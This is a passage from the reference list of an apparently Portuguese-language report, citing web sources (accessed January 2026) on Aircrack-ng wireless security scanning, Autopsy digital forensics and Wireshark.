44. Security Scanning with Aircrack-Ng \- Promwad, acessado em janeiro 10, 2026, [https://promwad.com/case-studies/access-point-vulnerability-scanning](https://promwad.com/case-studies/access-point-vulnerability-scanning)  
45. Aircrack-ng | Hackviser, acessado em janeiro 10, 2026, [https://hackviser.com/tactics/tools/aircrack-ng](https://hackviser.com/tactics/tools/aircrack-ng)  
46. Introduction to Wireless Security with Aircrack-ng, acessado em janeiro 10, 2026, [https://www.secureideas.com/blog/2018/09/introduction-to-wireless-security-with-aircrack-ng.html](https://www.secureideas.com/blog/2018/09/introduction-to-wireless-security-with-aircrack-ng.html)  
47. Autopsy (software) \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/Autopsy\_(software)](https://en.wikipedia.org/wiki/Autopsy_\(software\))  
48. Digital Forensics with Autopsy (Beginners guide) \- Hackercool Magazine, acessado em janeiro 10, 2026, [https://www.hackercoolmagazine.com/digital-forensics-with-autopsy-beginners-guide/](https://www.hackercoolmagazine.com/digital-forensics-with-autopsy-beginners-guide/)  
49. Wireshark \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/Wireshark](https://en.wikipedia.org/wiki/Wireshark)